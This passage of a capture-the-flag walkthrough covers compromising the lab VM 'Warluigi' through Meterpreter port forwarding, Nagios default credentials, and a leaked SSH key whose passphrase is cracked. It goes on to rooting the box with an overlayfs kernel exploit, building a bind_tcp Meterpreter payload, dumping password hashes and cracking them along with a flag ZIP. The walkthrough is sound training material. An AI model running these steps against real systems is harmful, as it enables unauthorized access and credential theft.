As the web server running on the Warluigi machine wasn't visible from outside the Mario host, I setup a port forward via the Meterpreter session to get access to it:

```shell_session
meterpreter > portfwd add -l 8080 -p 80 -r 192.168.122.122
[*] Local TCP relay created: :8080 <-> 192.168.122.122:80
```

With the port forward setup, I proceeded to run Nikto and dirb against the web server. Nikto was unable to find anything of interest, but dirb did find a Nagios installation that is protected by basic authentication:

```shell_session
root@kali:~# dirb http://10.2.0.3:8080 /usr/share/dirb/wordlists/big.txt
***
---- Scanning URL: http://10.2.0.3:8080/ ----
+ http://10.2.0.3:8080/cgi-bin/ (CODE:403|SIZE:285)
+ http://10.2.0.3:8080/nagios (CODE:401|SIZE:456)
+ http://10.2.0.3:8080/server-status (CODE:403|SIZE:290)
***
```

Metasploit contained no entry for Nagios in it's default credentials list, but a quick search revealed the default credentials for certain versions of Nagios are `nagiosadmin:nagios`, which was the case on the Warluigi VM.

I looked around the Nagios management page, but couldn't find any functionality that seemed exploitable at first glance, and none of the exploits I tried were successful.

## More Enumeration and Private Key Cracking
As there didn't seem to be any vulnerabilities in the web server, I went back to the Mario host session and began doing more enumeration. Meterpreter had previously failed to find any SSH keys, so I decided to search the entire file system, rather than just the default locations the post module checks:

```shell_session
meterpreter > shell
Process 2311 created.
Channel 12859 created.
find / -name '*rsa*' 2>/dev/null
/boot/grub/i386-pc/gcry_rsa.mod
/.bak/users/luigi/id_rsa
/.bak/users/luigi/id_rsa.pub
/etc/ssl/certs/GeoTrust_Universal_CA_2.pem
/etc/ssl/certs/VeriSign_Universal_Root_Certification_Authority.pem
/etc/ssl/certs/TC_TrustCenter_Universal_CA_I.pem
/etc/ssl/certs/GeoTrust_Universal_CA.pem
/etc/ssh/ssh_host_rsa_key
/etc/ssh/ssh_host_rsa_key.pub
/sys/module/8250/parameters/probe_rsa
/var/log/pm-powersave.log
/var/log/pm-powersave.log.1
/usr/share/ca-certificates/mozilla/GeoTrust_Universal_CA_2.crt
/usr/share/ca-certificates/mozilla/VeriSign_Universal_Root_Certification_Authority.crt
/usr/share/ca-certificates/mozilla/TC_TrustCenter_Universal_CA_I.crt
/usr/share/ca-certificates/mozilla/GeoTrust_Universal_CA.crt
/usr/share/help-langpack/en_GB/empathy/group-conversations.page
/usr/share/help-langpack/en_GB/empathy/irc-start-conversation.page
/usr/share/man/man1/rsautl.1ssl.gz
/usr/share/man/man1/rsa.1ssl.gz
/usr/share/man/man1/genrsa.1ssl.gz
/usr/share/man/man8/pm-powersave.8.gz
/usr/share/doc/alsa-base/driver/powersave.txt
/usr/share/applications/unity-universal-access-panel.desktop
/usr/share/terminfo/v/versaterm
/usr/share/bash-completion/completions/pm-powersave
/usr/share/zoneinfo/posix/Universal
/usr/share/zoneinfo/posix/Etc/Universal
/usr/share/zoneinfo/posix/Europe/Warsaw
/usr/share/zoneinfo/right/Universal
/usr/share/zoneinfo/right/Etc/Universal
/usr/share/zoneinfo/right/Europe/Warsaw
/usr/share/zoneinfo/Universal
/usr/share/zoneinfo/Etc/Universal
/usr/share/zoneinfo/Europe/Warsaw
/usr/share/app-install/icons/konversation.svgz
/usr/share/app-install/desktop/unity-control-center:unity-universal-access-panel.desktop
/usr/share/app-install/desktop/konversation:kde4__konversation.desktop
/usr/src/linux-headers-3.13.0-32/include/linux/irqchip/versatile-fpga.h
/usr/src/linux-headers-3.13.0-32/arch/arm/plat-versatile
/usr/src/linux-headers-3.13.0-32/arch/arm/mach-versatile
/usr/src/linux-headers-3.13.0-32/drivers/clk/versatile
/usr/src/linux-headers-3.13.0-32-generic/include/config/cpu/freq/gov/powersave.h
/usr/src/linux-headers-3.13.0-32-generic/include/config/devfreq/gov/powersave.h
/usr/src/linux-headers-3.13.0-32-generic/include/config/public/key/algo/rsa.h
/usr/src/linux-headers-3.13.0-32-generic/include/config/serial/8250/rsa.h
/usr/sbin/pm-powersave
/usr/lib/x86_64-linux-gnu/unity-control-center-1/panels/libuniversal-access.so
/usr/lib/python2.7/dist-packages/chardet/universaldetector.pyc
/usr/lib/python2.7/dist-packages/chardet/universaldetector.py
/usr/lib/grub/i386-pc/gcry_rsa.mod
/usr/lib/python3/dist-packages/chardet/universaldetector.py
/usr/lib/python3/dist-packages/chardet/__pycache__/universaldetector.cpython-34.pyc
/usr/lib/pm-utils/power.d/sched-powersave
/usr/lib/pm-utils/power.d/intel-audio-powersave
/usr/lib/pm-utils/sleep.d/00powersave
```

The particularly interesting files found in this search were:

* `/.bak/users/luigi/id_rsa`
* `/.bak/users/luigi/id_rsa.pub`

I headed over to the `/.bak/users/luigi` directory and had a look at what else was in there and found another message file:

```shell_session
meterpreter > cd /.bak/users/luigi
meterpreter > ls
Listing: /.bak/users/luigi
==========================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
40755/rwxr-xr-x   4096  dir   2017-03-10 15:25:42 +0000  .ssh
100600/rw-------  1766  fil   2017-03-10 16:07:51 +0000  id_rsa
100644/rw-r--r--  399   fil   2017-03-10 16:07:51 +0000  id_rsa.pub
100700/rwx------  145   fil   2017-03-10 15:23:57 +0000  message

meterpreter > cat message
Hi Luigi,

Since you've been messing around with my host, at this point I want to return the favour.
This is a "war", you "naughty" boy!

Mario.
```

As the key was presumably going to get me access to the Warluigi VM, I proceeded to setup another port forward, this time to port 22, and proceeded to try to connect using `id_rsa`:

```shell_session
meterpreter > portfwd add -l 2222 -p 22 -r 192.168.122.122
[*] Local TCP relay created: :2222 <-> 192.168.122.122:22
meterpreter > portfwd

Active Port Forwards
====================

   Index  Local         Remote              Direction
   -----  -----         ------              ---------
   1      0.0.0.0:8080  192.168.122.122:80  Forward
   2      0.0.0.0:2222  192.168.122.122:22  Forward

2 total active port forwards.

```
```
root@kali:~# ssh -i warluigi_rsa/id_rsa warluigi@10.2.0.3 -p 2222

***

@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for 'warluigi_rsa/id_rsa' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "warluigi_rsa/id_rsa": bad permissions
```

After forgetting to apply the correct permissions, I ran `chmod 400 warluigi_rsa/id_rsa` and tried again, to find that the key had a passphrase.

In an attempt to build up a relevant word list, I used three words as the seeds for the permutations:

* warluigi (the name of the VM)
* war (one of the two words in Mario's last message that were en-quoted)
* naughty (one of the two words in Mario's last message that were en-quoted)

```shell_session
root@kali:~# john --wordlist=warluigi.txt --rules --stdout > warluigi-mutated.txt
Press 'q' or Ctrl-C to abort, almost any other key for status
148p 0:00:00:00 100.00% (2017-06-13 21:23) 2114p/s Naughtying
```

Once I had the word list built, I proceeded to run the private key through `ssh2john` and then cracked it using JTR:

```shell_session
root@kali:~# ssh2john warluigi_rsa/id_rsa > warluigi_rsa/id_john
root@kali:~# john --wordlist=warluigi-mutated.txt warluigi_rsa/id_john
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA 32/32])
Press 'q' or Ctrl-C to abort, almost any other key for status
warluigi         (id_rsa)
1g 0:00:00:00 DONE (2017-06-13 21:40) 33.33g/s 33.33p/s 33.33c/s 33.33C/s warluigi
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

## Getting Root on Warluigi VM
Much like the Mario host, getting root on the Warluigi VM is just a case of compiling and running the overlayfs exploit:

```shell_session
warluigi@warluigi:~$ uname -a
Linux warluigi 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
warluigi@warluigi:~$ nano ofs.c
warluigi@warluigi:~$ gcc ofs.c -o ofs
warluigi@warluigi:~$ chmod +x ofs
warluigi@warluigi:~$ ./ofs
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# whoami
root
```

Once I had root, I setup the `multi_handler` module in Metasploit again, but this time with the `bind_tcp` payload, in order to get a Meterpreter session on Warluigi:

```shell_session
msf exploit(handler) > set payload linux/x86/meterpreter/bind_tcp
payload => linux/x86/meterpreter/bind_tcp
msf exploit(handler) > set RHOST 192.168.122.122
RHOST => 192.168.122.122
```

```shell_session
root@kali:~# msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=192.168.128.128 LPORT=5555 -f elf > warluigi_bind.elf
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 110 bytes
Final size of elf file: 194 bytes
```

## Finding & Cracking the Last Flag
After getting the Meterpreter session, I took a look in `/root` as per the previous host, and found a file named `.hint.txt` and another ZIP file that seemingly contained a flag:

```shell_session
meterpreter > ls /root
Listing: /root
==============

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100600/rw-------  0     fil   2017-03-15 19:48:47 +0000  .bash_history
100644/rw-r--r--  3106  fil   2014-02-20 02:43:56 +0000  .bashrc
100644/rw-r--r--  148   fil   2017-03-10 20:47:50 +0000  .hint.txt
40700/rwx------   4096  dir   2017-03-10 16:55:59 +0000  .mozilla
100644/rw-r--r--  140   fil   2014-02-20 02:43:56 +0000  .profile
100600/rw-------  0     fil   2017-03-15 14:14:10 +0000  .viminfo
100644/rw-r--r--  401   fil   2017-03-15 14:10:05 +0000  flag2.zip

meterpreter > download flag2.zip
[*] downloading: flag2.zip -> flag2.zip
[*] download   : flag2.zip -> flag2.zip

```

The hint file contained another message about Princess Peach:

> So, today I saw her again, Peach. I'm so in love for her but my brother is completely lost for her.
I know that he loves Peach, but Peach Loves Me.

Also within the `/root` directory was a `.mozilla` directory, suggesting that the machine may have FireFox data on it, which led me to run the `firefox_creds` post module, but it returned nothing:

```shell_session
meterpreter > run post/multi/gather/firefox_creds

[*] Checking for Firefox profile in: /root/.mozilla/firefox
[*] Checking for Firefox profile in: /home/nagios/.mozilla/firefox
[*] Checking for Firefox profile in: /home/warluigi/.mozilla/firefox
[-] No users found with a Firefox directory
```
Next, I dumped the user hashes, as I'd have to crack these to finish the challenge anyway:

```shell_session
meterpreter > run post/linux/gather/hashdump

[+] root:$6$SZW8sIi9$wOVuR1P.rTHmPXQ7hmlmKWfZqAglZdRSFm8lUuvqvVPv3gbGtuhUmbpjcc/qyuPToTwJUwPrQkVxybYQQSTyO/:0:0:root:/root:/bin/bash
[+] nagios:$6$z8IWvJ1q$iASVAFseJ7asm37NKa1N5FRS0oXJc8lCE/oMEovyxOJwcNOr29hf5rejvWsQ1a0GBtivqM/i7pN2Ixw4AKyf..:1001:1001::/home/nagios:/bin/bash
[+] warluigi:$6$DLTvExsa$UjG07oKR9IZuTTlSAeK1Bt21Jr/U3Ket033QlaeonPo2miRkHGpG.SjiNazc2BNyVyeDpmKyc9fPB67LpiT8B0:1000:1000:,,,:/home/warluigi:/bin/bash
[+] Unshadowed Password File: /root/.msf4/loot/20170613232331_default_192.168.122.122_linux.hashes_125801.txt
```

I continued to look for some plain-text credentials that may be hanging around the system by checking out the Nagios installation. The sample configuration file that I found in `/opt/nagios-4.1.1/sample-config/nagios.cfg` suggested that there was a resource file that could store passwords in it:

```ini
# RESOURCE FILE
# This is an optional resource file that contains $USERx$ macro
# definitions. Multiple resource files can be specified by using
# multiple resource_file definitions.  The CGIs will not attempt to
# read the contents of resource files, so information that is
# considered to be sensitive (usernames, passwords, etc) can be
# defined as macros in this file and restrictive permissions (600)
# can be placed on this file.

resource_file=/usr/local/nagios/etc/resource.cfg
```

I checked out the default location of `resource.cfg`, and whilst the file was there, there were no passwords within it. Likewise, the only user within `/usr/local/nagios/etc/htpasswd.users` was the previously identified default user [`nagiosadmin`], so it was seeming this may just be an unconfigured installation without much to go on.

Having failed to find any plain text credentials, I proceeded to build up a new word list, using the previously found hint file as a basis for it. The phrase "Peach Loves Me" stood out in the hint file, as it was in proper case, so I created a few permutations of this manually along with "warluigi" and used them as the seed for the word list I created using JTR:

```shell_session
root@kali:~# john --wordlist=flag2list.txt --rules --stdout > flag2mutations.txt
Press 'q' or Ctrl-C to abort, almost any other key for status
252p 0:00:00:00 100.00% (2017-06-13 23:51) 3600p/s Warluiging
```

With the word list created, I attempted to crack the ZIP file with it, and got an almost instant result:

```shell_session
root@kali:~# fcrackzip -u -D -p flag2mutations.txt flag2.zip -v
found file 'flag2.txt', (size cp/uc    217/   331, flags 9, chk a491)

PASSWORD FOUND!!!!: pw == peachlovesme

root@kali:~# unzip flag2.zip
Archive:  flag2.zip
[flag2.zip] flag2.txt password:
  inflating: flag2.txt               
```

The content of the second and last flag reads:

> Congratulations on your second flag!

> As already mentioned in supermariohost, there are multiple ways to hack this machine. The goal is to get all the passwords of all the users in this machine. If you did it, then congratulations, I hope you had fun :D

> Keep in touch on twitter through @mr_h4sh

> Congratulations again!

> mr_h4sh

And to finish up, I used the same word list to try and crack the user password hashes and revealed both the warluigi and root passwords:

```shell_session
root@kali:~# john --wordlist=flag2mutations.txt /root/.msf4/loot/20170613232331_default_192.168.122.122_linux.hashes_125801.txt
Warning: detected hash type "sha512crypt", but the string is also recognized as "crypt"
Use the "--format=crypt" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovepeach       (warluigi)
peachlovesme     (root)
2g 0:00:00:01 DONE (2017-06-13 23:56) 2.000g/s 252.0p/s 380.0c/s 380.0C/s Peachlovesme0..Warluiging
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
